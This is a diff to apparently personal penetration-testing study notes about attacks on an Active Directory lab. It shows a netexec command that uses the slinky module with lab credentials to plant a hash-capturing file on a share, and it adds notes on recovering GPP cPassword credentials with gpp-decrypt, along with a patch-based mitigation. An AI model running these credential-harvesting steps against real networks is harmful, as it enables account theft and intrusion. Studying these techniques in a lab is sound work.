@@ -202,4 +202,13 @@ sudo resonder -I eth0 -dP
 
 Can also use netexec to drop the file from attacker machine:
 netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149
-Slinky is a module that will download the file test on the accessible share on the specified machine
+Slinky is a module that will download the file test on the accessible share on the specified machine.
+
+## GPP / cPassword Attacks and Mitigations
+
+Group Policy Preferences allowed admins to create policies using embedded credentials.
+These credentials were encrypted and places in a "cPassword". Key got released accidentally, patched but can still be found.
+
+In some filses if we find cPassword field (xml), use gpp-decrypt tool
+
+Mitigation is to patch (KB2962486) and elete the old GPP XML
